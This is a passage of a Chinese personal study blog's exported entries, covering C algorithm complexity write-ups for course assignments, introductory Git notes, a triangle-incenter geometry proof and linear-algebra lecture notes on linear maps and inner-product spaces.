函数;</p><h3 id="复杂度估计"><a href="#复杂度估计" class="headerlink" title="复杂度估计"></a>复杂度估计</h3><p>数据输入过程的时间复杂度为 $O(n)$; 数据排序过程的时间复杂度为 $O(nlogn)$.</p><p>而算法时间复杂度主要来自二分查找交点的过程:</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token comment">// Line 13</span><span class="token comment">// cross 函数返回与线段 OP 存在交点的最上方线段标号.</span><span class="token keyword">int</span> <span class="token function">cross</span> <span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token keyword">if</span> <span class="token punctuation">(</span>n <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> low <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>          <span class="token keyword">int</span> high <span class="token operator">=</span> n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>          <span class="token keyword">int</span> mid <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>         <span class="token keyword">while</span> <span class="token punctuation">(</span>low <span class="token operator">&lt;=</span> high<span class="token punctuation">)</span> <span class="token punctuation">{</span>              mid <span class="token operator">=</span> <span class="token punctuation">(</span>low <span class="token operator">+</span> high<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">;</span>                  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其中每经过一次 <code>while</code> 循环都要访问若干次 <code>toleft</code> 函数, 此函数调用的时间为常数时间, 因此 <code>cross</code> 函数的时间复杂度与二分查找相同, 为 $O(logn)$.</p><p>进而对于 $n$ 条线段信息的输入, 进行 $m$ 次查询, 算法的时间复杂度为 $O(mlogn)$.</p><p>算法空间复杂度主要来自存储横纵坐标与相应乘积的过程:</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token keyword">long</span> <span class="token keyword">long</span> x<span class="token punctuation">[</span>n<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">long</span> <span class="token keyword">long</span> y<span class="token punctuation">[</span>n<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">long</span> <span class="token keyword">long</span> z<span class="token punctuation">[</span>n<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>正比于输入数据的数目, 对于 $n$ 条线段信息的输入, 算法的空间复杂度为 $O(n)$.</p>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
          <category> DSA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DSA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>A+B Problem</title>
      <link href="/10/"/>
      <url>/10/</url>
      
        <content type="html"><![CDATA[<h1 id="CST-PA1"><a href="#CST-PA1" class="headerlink" title="CST PA1"></a>CST PA1</h1><h2 id="1-1-A-B-Problem"><a href="#1-1-A-B-Problem" class="headerlink" title="1-1 A+B Problem"></a>1-1 A+B Problem</h2><h3 id="算法构思"><a href="#算法构思" class="headerlink" title="算法构思"></a>算法构思</h3><p>一开始考虑使用普通的高精度乘法处理本题:</p><blockquote><p>使用 $\text{string}$ 存储读入的长正整数 $a = \overline{a_{n - 1}a_{n - 2}\cdots a_1a_0}$, $b = \overline{b_{m - 1}b_{m - 2}\cdots b_1b_0}$, 并逐位计算乘积 $c = \overline{c_{l - 1}c_{l - 2}\cdots c_1c_0}$, 满足 $c_k = (\Sigma a_ib_{k - i} + d_k) / 10$, 其中 $d_k$ 为计算 $c_{k - 1}$ 过程产生的进位溢出, 满足 $d_k = (\Sigma a_ib_{k - 1 - i} + d_{k - 1}) % 10$.</p></blockquote><p>美中不足的是, 这种处理方法计算次数过多, 消耗时间过长, 因此考虑采用压位高精度乘法, 即在上述算法中乘数的每位数字均存入一个 $8$ 位整数, 而非一个简单的十进制整数. 这样扩大了参与单次计算的数据位数, 进而减少了计算次数, 降低了算法耗时.</p><p>由于 $\text{int}$ 的范围为 $[- 2^{31}, 2^{31} - 1]$, 其中 $2^{31} - 1 &lt; 10^8 * 10^8$, 在进行 $8$ 位数运算时可能会产生溢出, 因此不可选用 $\text{int}$ 存储乘数;</p><p>注意到 $\text{long long}$ 的范围为 $[- 2^{63}, 2^{63} - 1]$, 其中 $2^{63} - 1 &gt; 10^8 * 10^8$, 因此这里选用 $\text{long long}$ 数组来存储乘数. 本题也就相当于模拟 $100,000,000$ 进制的乘法. 本题算法思路如下:</p><blockquote><p>使用 $\text{long long}$ 数组存储读入的长正整数 $a = \overline{a_{n’ - 1}a_{n’ - 2}\cdots a_1a_0}$, $b = \overline{b_{m’ - 1}b_{m’ - 2}\cdots b_1b_0}$, 其中 $a_i, b_j (1\le i\le n’, 1\le j\le m’)$ 均为 $8$ 位整数. 剩下的仿照上文所述的乘法计算及进位过程即可.</p></blockquote><p>代码中的 <code>mul1</code>、 <code>mul2</code> 数组相当于此处的 $a, b$, 而 <code>answer</code> 数组记录了相应 $c$ 的取值.</p><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p>使用了一个快速将 $\text{string}$ 按每八位读入数组的 $trick$, 主要参考了<a href="https://zhuanlan.zhihu.com/p/369302523">此文章</a>, 调用了 <code>&lt;stdio.h&gt;</code> 中的 <code>sscanf()</code> 函数.</p><h3 id="复杂度估计"><a href="#复杂度估计" class="headerlink" title="复杂度估计"></a>复杂度估计</h3><p>算法时间复杂度主要来自乘法运算与进位过程:</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token comment">// Line 48 </span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> LEN<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> start <span class="token operator">=</span> <span class="token function">max</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> i <span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">-</span> real_len2<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> finish <span class="token operator">=</span> <span class="token function">min</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> real_len1 <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> start<span class="token punctuation">;</span> j <span class="token operator">&lt;=</span> finish<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span>        answer<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+=</span> mul1<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">*</span> mul2<span class="token punctuation">[</span>i <span class="token operator">-</span> j<span class="token punctuation">]</span><span class="token punctuation">;</span>     <span class="token keyword">if</span> <span class="token punctuation">(</span>answer<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&gt;=</span> MAX<span class="token punctuation">)</span> <span class="token punctuation">{</span>                         answer<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+=</span> answer<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">/</span> MAX<span class="token punctuation">;</span>        answer<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">%=</span> MAX<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>对于一组长整数输入$m$、$n$, 算法的时间复杂度为 $O(logm\cdot logn)$;</p><p>也即若一组长整数输入的十进制位数分别为$m$、$n$, 那么算法的时间复杂度为 $O(mn)$.</p><p>算法空间复杂度主要来自读取并存储运算数的过程:</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token comment">// Line 22</span><span class="token keyword">char</span><span class="token operator">*</span> num1 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span>a<span class="token punctuation">.</span><span class="token function">c_str</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">char</span><span class="token operator">*</span> num2 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span>b<span class="token punctuation">.</span><span class="token function">c_str</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token comment">// Line 27</span><span class="token keyword">long</span> <span class="token keyword">long</span> mul1<span class="token punctuation">[</span>real_len1<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">long</span> <span class="token keyword">long</span> mul2<span class="token punctuation">[</span>real_len2<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">long</span> <span class="token keyword">long</span> answer<span class="token punctuation">[</span>MAXLEN<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>正比于输入数据的长度, 对于一组长整数输入$m$、$n$, 算法的空间复杂度为 $O(logm + logn) = O(log(mn))$;</p><p>也即若一组输入的十进制位数分别为$m$、$n$, 那么算法的空间复杂度为 $O(m + n)$.</p>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
          <category> DSA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DSA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Git入门学习</title>
      <link href="/9/"/>
      <url>/9/</url>
      
        <content type="html"><![CDATA[<h2 id="What-Are-VCSs"><a href="#What-Are-VCSs" class="headerlink" title="What Are VCSs?"></a>What Are VCSs?</h2><p>Version control systems (VCSs) are tools used to track changes to a folder and its contents in a series of snapshots. They also maintain metadata like who created each snapshot, messages associated with each snapshot, and so on.</p><p>While other VCSs exist, <strong>Git</strong> is the de facto standard for version control. </p><h2 id="Data-Model"><a href="#Data-Model" class="headerlink" title="Data Model"></a>Data Model</h2><p>Git has a well-thought-out model that enables maintaining history, supporting branches, and collaboration.</p><h3 id="Snapshots"><a href="#Snapshots" class="headerlink" title="Snapshots"></a>Snapshots</h3><p>Git models the history of a collection of files and folders within some top-level directory as a series of snapshots.</p><ul><li>File – Blob</li><li>Directory – Tree </li><li>Snapshot – The top-level tree being tracked</li></ul><h3 id="History-Relating-snapshots"><a href="#History-Relating-snapshots" class="headerlink" title="History: Relating snapshots"></a>History: Relating snapshots</h3><p>In Git, a history is a directed acyclic graph (DAG) of snapshots. This means that each snapshot in Git refers to a set of “parents”, the snapshots that preceded it. Moreover, a snapshot might descend from multiple parents due to combining (merging) two parallel branches of development.</p><h3 id="Data-model-As-pseudocode"><a href="#Data-model-As-pseudocode" class="headerlink" title="Data model: As pseudocode"></a>Data model: As pseudocode</h3><p>It is instructive to see Git’s data model written down in pseudocode.</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token builtin">type</span> blob <span class="token operator">=</span> array<span class="token operator">&lt;</span>byte<span class="token operator">&gt;</span><span class="token builtin">type</span> tree <span class="token operator">=</span> <span class="token builtin">map</span><span class="token operator">&lt;</span>string<span class="token punctuation">,</span> tree <span class="token operator">|</span> blob<span class="token operator">&gt;</span><span class="token builtin">type</span> commit <span class="token operator">=</span> struct <span class="token punctuation">{</span>    parents<span class="token punctuation">:</span> array<span class="token operator">&lt;</span>commit<span class="token operator">&gt;</span>    author<span class="token punctuation">:</span> string    message<span class="token punctuation">:</span> string    snapshot<span class="token punctuation">:</span> tree<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Objects-and-Content-Addressing"><a href="#Objects-and-Content-Addressing" class="headerlink" title="Objects and Content-Addressing"></a>Objects and Content-Addressing</h3><p>An “object” is a blob, tree, or commit. In Git data store, all objects are content-addressed by <a href="https://en.wikipedia.org/wiki/SHA-1">SHA-1 hash</a>.</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token builtin">type</span> <span class="token builtin">object</span> <span class="token operator">=</span> blob <span class="token operator">|</span> tree <span class="token operator">|</span> commitobjects <span class="token operator">=</span> <span class="token builtin">map</span><span class="token operator">&lt;</span>string<span class="token punctuation">,</span> <span class="token builtin">object</span><span class="token operator">&gt;</span><span class="token keyword">def</span> <span class="token function">store</span><span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token builtin">id</span> <span class="token operator">=</span> sha1<span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">)</span>    objects<span class="token punctuation">[</span><span class="token builtin">id</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">object</span><span class="token keyword">def</span> <span class="token function">load</span><span class="token punctuation">(</span><span class="token builtin">id</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> objects<span class="token punctuation">[</span><span class="token builtin">id</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="References"><a href="#References" class="headerlink" title="References"></a>References</h3><p>Git’s solution is human-readable names for SHA-1 hashes, called “references”. References are mutable pointers to commits. For example, the <code>master</code> reference usually points to the latest commit in the main branch of development. Moreover, “where we currently are” is a special reference called “HEAD”.</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">references <span class="token operator">=</span> <span class="token builtin">map</span><span class="token operator">&lt;</span>string<span class="token punctuation">,</span> string<span class="token operator">&gt;</span><span class="token keyword">def</span> <span class="token function">update_reference</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> <span class="token builtin">id</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    references<span class="token punctuation">[</span>name<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">id</span><span class="token keyword">def</span> <span class="token function">read_reference</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> references<span class="token punctuation">[</span>name<span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">load_reference</span><span class="token punctuation">(</span>name_or_id<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> name_or_id <span class="token keyword">in</span> references<span class="token punctuation">:</span>        <span class="token keyword">return</span> load<span class="token punctuation">(</span>references<span class="token punctuation">[</span>name_or_id<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> load<span class="token punctuation">(</span>name_or_id<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Repositories"><a href="#Repositories" class="headerlink" title="Repositories"></a>Repositories</h3><p>A Git <em>repository</em> is the data <code>objects</code> and <code>references</code>.</p><h2 id="Staging-Area"><a href="#Staging-Area" class="headerlink" title="Staging Area"></a>Staging Area</h2><p>For example, imagine a scenario where you have debugging print statements added all over your code, along with a bugfix; you want to commit the bugfix while discarding all the print statements.</p><p>Git accommodates such scenarios by allowing you to specify which modifications should be included in the next snapshot through a mechanism called the “staging area”.</p><h2 id="Command-Line-Interface"><a href="#Command-Line-Interface" class="headerlink" title="Command-Line Interface"></a>Command-Line Interface</h2><h3 id="Basics"><a href="#Basics" class="headerlink" title="Basics"></a>Basics</h3><ul><li><code>git help &lt;command&gt;</code>: get help for a command</li><li><code>git init</code>: create a new git repo with data stored in the <code>.git</code> directory</li><li><code>git status</code>: tell what is going on</li><li><code>git add &lt;filename&gt;</code>: add files to staging area</li><li><code>git commit</code>: create a new commit<ul><li>Write <a href="https://tbaggery.com/2008/04/19/a-note-about-git-commit-messages.html">good commit messages</a>!</li><li>More reasons to write <a href="https://chris.beams.io/posts/git-commit/">good commit messages</a>!</li></ul></li><li><code>git log</code>: show a flattened log of history</li><li><code>git log --all --graph --decorate</code>: visualizes history as a DAG</li><li><code>git diff &lt;filename&gt;</code>: show changes made to the staging area</li><li><code>git diff &lt;revision&gt; &lt;filename&gt;</code>: show differences in a file between snapshots</li><li><code>git checkout &lt;revision&gt;</code>: update HEAD and current branch</li></ul><h3 id="Branching-and-Merging"><a href="#Branching-and-Merging" class="headerlink" title="Branching and Merging"></a>Branching and Merging</h3><ul><li><code>git branch</code>: show branches</li><li><code>git branch &lt;name&gt;</code>: create a branch</li><li><code>git checkout -b &lt;name&gt;</code>: create a branch and switch to it</li><li><code>git merge &lt;revision&gt;</code>: merge into current branch</li><li><code>git mergetool</code>: use a fancy tool to help resolve merge conflicts</li><li><code>git rebase</code>: rebase set of patches onto a new base</li></ul><h3 id="Remotes"><a href="#Remotes" class="headerlink" title="Remotes"></a>Remotes</h3><ul><li><code>git remote</code>: list remotes</li><li><code>git remote add &lt;name&gt; &lt;url&gt;</code>: add a remote</li><li><code>git push &lt;remote&gt; &lt;local branch&gt;:&lt;remote branch&gt;</code>: send objects to remote and update remote reference</li><li><code>git branch --set-upstream-to=&lt;remote&gt;/&lt;remote branch&gt;</code>: set up correspondence between local and remote branch</li><li><code>git fetch</code>: retrieve objects/references from a remote</li><li><code>git pull</code>: same as <code>git fetch; git merge</code></li><li><code>git clone</code>: download repository from remote</li></ul><h3 id="Undo"><a href="#Undo" class="headerlink" title="Undo"></a>Undo</h3><ul><li><code>git config</code>: Git is <a href="https://git-scm.com/docs/git-config">highly customizable</a></li><li><code>git clone --depth=1</code>: shallow clone, without entire version history</li><li><code>git add -p</code>: interactive staging</li><li><code>git rebase -i</code>: interactive rebasing</li><li><code>git blame</code>: show who last edited which line</li><li><code>git stash</code>: temporarily remove modifications to working directory</li><li><code>git bisect</code>: binary search history</li><li><code>.gitignore</code>: <a href="https://git-scm.com/docs/gitignore">specify</a> intentionally untracked files to ignore</li></ul>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
          <category> Git </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>几何一窥</title>
      <link href="/8/"/>
      <url>/8/</url>
      
        <content type="html"><![CDATA[<p><strong>Problem:</strong></p><p>$I$是$\triangle ABC$内心, $P, Q$是$I$在$AB, AC$上的投影, 直线$PQ$交$\triangle ABC$的外接圆于$X, Y$两点, $B, I, P, X$共圆. 求证: $C, I, Q, Y$四点共圆.</p><p><strong>Proof:</strong></p><p>由$\angle API=\angle AQI=90^\circ$, 得$A, P, I, Q$四点共圆.</p><p>故$$\angle BIX+\angle BIC=\angle BPX+90^\circ + \frac{1}{2}\angle BAC=180^\circ.$$</p><p>即$C, I, X$三点共线. 又因为$B, I, P, X$四点共圆, </p><p>知$\angle BXI=\angle BPI=90^\circ$, 即$BX\perp CX$, $BC$为$\odot ABC$的直径, $AB\perp AC$.</p><p>从而四边形$APIQ$为正方形. 取弧$\mathop{AC}\limits^{\frown}$中点$Z$, 由鸡爪定理知$ZA=ZI=ZC$成立.</p><p>从而点$Z$位于线段$AI$的垂直平分线上. 又正方形$APIQ$中, $PQ$垂直平分$AI$,</p><p>故点$Z$位于直线$PQ$上, $P, Q, Z$三点共线. 又显然点$Z$与点$X$不重合,</p><p>故点$Z$与点$Y$重合, $Y$为弧$\mathop{AC}\limits^{\frown}$中点. </p><p>由鸡爪定理知$B, I, Y$三点共线. </p><p>进而$\angle IYC=\angle BYC=90^\circ=\angle IQC$, </p><p>即$C, I, Q, Y$四点共圆.</p><p><img src="/pic/05.png"></p>]]></content>
      
      
      <categories>
          
          <category> Maths </category>
          
          <category> Geometry </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Maths </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>高等代数选讲</title>
      <link href="/7/"/>
      <url>/7/</url>
      
        <content type="html"><![CDATA[<h2 id="Chapter-1-抽象线性空间理论"><a href="#Chapter-1-抽象线性空间理论" class="headerlink" title="Chapter 1 抽象线性空间理论"></a>Chapter 1 抽象线性空间理论</h2><h3 id="Definition-1"><a href="#Definition-1" class="headerlink" title="Definition 1"></a>Definition 1</h3><ul><li>给定线性空间 $\mathcal{U, V}$, 用 $\mathcal{Hom}_{\mathbb{F}}\mathcal{(U, V)}$ 表示从 $\mathcal{U}$ 到 $\mathcal{V}$ 的线性映射的全体.  </li><li>容易验证 $\mathcal{Hom}_{\mathbb{F}}\mathcal{(U, V)}$ 同时也是 $\mathbb{F}$ 上的线性空间.</li></ul><h3 id="Example-1"><a href="#Example-1" class="headerlink" title="Example 1"></a>Example 1</h3><ul><li>$\mathcal{Hom}_{\mathbb{R}}(\mathbb{R}^n, \mathbb{R}^m)$ 表示全体 $m\times n$ 矩阵.</li></ul><h3 id="Property-1"><a href="#Property-1" class="headerlink" title="Property 1"></a>Property 1</h3><ul><li>对 $f\in\mathcal{Hom}<em>{\mathbb{F}}\mathcal{(U, V)}, g\in\mathcal{Hom}</em>{\mathbb{F}}\mathcal{(V, W)}$, 有 $g\circ f\in\mathcal{Hom}_{\mathbb{F}}\mathcal{(U, W)}$.</li></ul><h3 id="Definition-2"><a href="#Definition-2" class="headerlink" title="Definition 2"></a>Definition 2</h3><ul><li>给定线性空间 $\mathcal{U, V}$, 若存在线性双射 $f:\mathcal{U}\rightarrow\mathcal{V}$, 则称 $\mathcal{U, V}$ 线性同构, 同构定义了一种等价关系.</li></ul><h3 id="Question-1"><a href="#Question-1" class="headerlink" title="Question 1"></a>Question 1</h3><ul><li>如何考虑以同构为基础的线性空间分类?</li><li>对 $n$ 维线性空间 $\mathcal{V}/\mathbb{F}$ 的一组基为 $e_1, \dots, e_n$, 考虑映射 $\sigma_{e_1,\dots, e_n}:\mathcal{V}\rightarrow\mathbb{F}^n, x\rightarrow (x_1, \dots, x_n)^T$.<ul><li>其中 $x=\sum_{i=1}^n{x_ie_i}=(e_1, \dots, e_n)(x_1, \dots, x_n)^T$, 此时 $\sigma_{e_1,\dots, e_n}$ 为 $\mathbb{F}$ 上的线性同构.</li></ul></li></ul><h3 id="Definition-3"><a href="#Definition-3" class="headerlink" title="Definition 3"></a>Definition 3</h3><ul><li>对于 $n$ 维线性空间 $\mathcal{V}$ 的两组基 $(e_1, \dots, e_n)$ 与 $(t_1, \dots, t_n)$,<br>$(t_1, \dots, t_n)=(e_1, \dots, e_n)\left( \begin{matrix}<br>t_{11}&amp;\cdots&amp;t_{1n}\<br>\vdots&amp;&amp;\vdots\<br>t_{n1}&amp;\cdots&amp;t_{nn}\<br>\end{matrix} \right)  =(e_1, \dots, e_n)T$, 称 $T$ 为过渡矩阵.</li><li>对$\forall x\in\mathcal{V}$, <ul><li>若 $x=(e_1, \dots, e_n)(x_1, \dots, x_n)^T=(t_1, \dots, t_n)(y_1, \dots, y_n)^T$,<br>那么有 $(x_1, \dots, x_n)^T=T(y_1, \dots, y_n)^T$, 这是由基的表示法的唯一性所决定的.</li></ul></li></ul><h3 id="Definition-4"><a href="#Definition-4" class="headerlink" title="Definition 4"></a>Definition 4</h3><ul><li>$n$ 维线性空间 $\mathcal{U}/\mathbb{F}$, 其上一组基为 $(e_1, \dots, e_n)$; </li><li>$m$ 维线性空间 $\mathcal{V}/\mathbb{F}$, 其上一组基为 $(i_1, \dots, i_m)$. </li><li>考虑从 $\mathcal{U}$ 到 $\mathcal{V}$ 的线性映射 $f$:<ul><li>由 $f(e_1)=(i_1, \dots, i_m)(F(\vec{e_1}))$, 进而有</li><li>$(f(e_1), \dots, f(e_n))=(i_1, \dots, i_m)(F(\vec{e_1}), \dots, F(\vec{e_n}))=(i_1, \dots, i_m)F$.</li></ul></li><li>称 $F$ 为基 $e_1,\dots, e_n, i_1, \dots, i_m$ 下的表示矩阵.</li></ul><h3 id="Tip-1"><a href="#Tip-1" class="headerlink" title="Tip 1"></a>Tip 1</h3><ul><li>$\mathcal{Hom}<em>{\mathbb{F}}\mathcal{(U, V)}\xrightarrow{\sigma</em>{e_1,\dots, e_n, i_1, \dots, i_m}}\mathbb{F}^{m\times n}$ 是一个同构映射.</li></ul><h3 id="Tip-2"><a href="#Tip-2" class="headerlink" title="Tip 2"></a>Tip 2</h3><ul><li>表示矩阵相乘表示基底相传递.</li></ul><h3 id="Question-2"><a href="#Question-2" class="headerlink" title="Question 2"></a>Question 2</h3><ul><li>线性映射在不同基下的表示矩阵如何变化?<ul><li>$\mathcal{U}:(t_1, \dots, t_n)=(e_1, \dots, e_n)T$,</li><li>$\mathcal{V}:(s_1, \dots, s_m)=(i_1, \dots, i_m)S$,</li><li>线性映射 $f:\mathcal{U}\rightarrow\mathcal{V}$.</li></ul></li><li>记 $\sigma_{e_1,\dots, e_n, i_1, \dots, i_m}(f) = F$, 则 $\sigma_{t_1,\dots, t_n, s_1, \dots, s_m}(f) = S^{-1}FT$.</li></ul><h3 id="Tip-3"><a href="#Tip-3" class="headerlink" title="Tip 3"></a>Tip 3</h3><ul><li>$\mathcal{U}:(q_1, \dots, q_n)=(e_1, \dots, e_n)Q$,<ul><li>其中 $(q_1, \dots, q_n), (e_1, \dots, e_n)$ 是 $\mathcal{U}$ 的两组标准正交基,</li><li>线性映射 $f:\mathcal{U}\rightarrow\mathcal{U}$.</li></ul></li><li>记 $\sigma_{e_1,\dots, e_n}(f) = F$, 则 $\sigma_{q_1,\dots, q_n}(f) = Q^{-1}FQ = Q^TFQ$.</li><li>这也就是说：<ul><li>$n$ 阶方阵 $A, B$ 正交相似 $\Longleftrightarrow A, B$ 是 $n$ 维线性空间某个线性变换在两组标准正交基下的矩阵.</li></ul></li></ul><h2 id="Chapter-2-欧氏空间"><a href="#Chapter-2-欧氏空间" class="headerlink" title="Chapter 2 欧氏空间"></a>Chapter 2 欧氏空间</h2><h3 id="Definition-1-1"><a href="#Definition-1-1" class="headerlink" title="Definition 1"></a>Definition 1</h3><ul><li>给定线性空间 $\mathcal{V}/\mathbb{R}$, $\left&lt;\cdot, \cdot\right&gt;:\mathcal{V}\times\mathcal{V}\rightarrow\mathbb{R}$, 满足 $\forall a,b\in\mathcal{V}$, 有<ul><li>$a)$ 对称性: $\left&lt;a, b\right&gt; = \left&lt;b, a\right&gt;$;</li><li>$b)$ 双线性性: $\left&lt;k_1a_1+k_2a_2, b\right&gt; = k_1\left&lt;a_1, b\right&gt; + k_2\left&lt;a_2, b\right&gt;$;</li><li>$c)$ 正定性: $\left&lt;a, a\right&gt; \ge 0$, 取等当且仅当 $a = 0$.</li></ul></li><li>则称二元函数是 $\mathcal{V}$ 上的一个内积, 具有内积的线性空间称为一个实内积空间,或欧氏空间.</li></ul><h3 id="Example-1-1"><a href="#Example-1-1" class="headerlink" title="Example 1"></a>Example 1</h3><ul><li>$\mathbb{R}^n\quad \left&lt;a, b\right&gt; = a^Tb$ 是 $\mathbb{R}^n$上的标准内积. </li><li>现在考虑一般的情况 $\left&lt;a, b\right&gt; = a^TAb$, 其中 $A\in\mathbb{R}^{n\times n}$. <ul><li>为了满足对称性 $\left&lt;a, b\right&gt; = a^TAb = \left&lt;b, a\right&gt; =  b^TAa = a^TA^Tb$, 需要 $A$ 对称;</li><li>为了满足正定性 $\left&lt;a, a\right&gt; = a^TAa \ge 0$, 需要 $A$ 正定;</li></ul></li><li>此时双线性性是显然满足的; </li><li>所以只要 $A$ 对称正定, $\mathbb{R}^n$ 上的二元函数 $\left(a, b\right)\rightarrow a^TAb$ 是内积.</li></ul><h3 id="Example-2"><a href="#Example-2" class="headerlink" title="Example 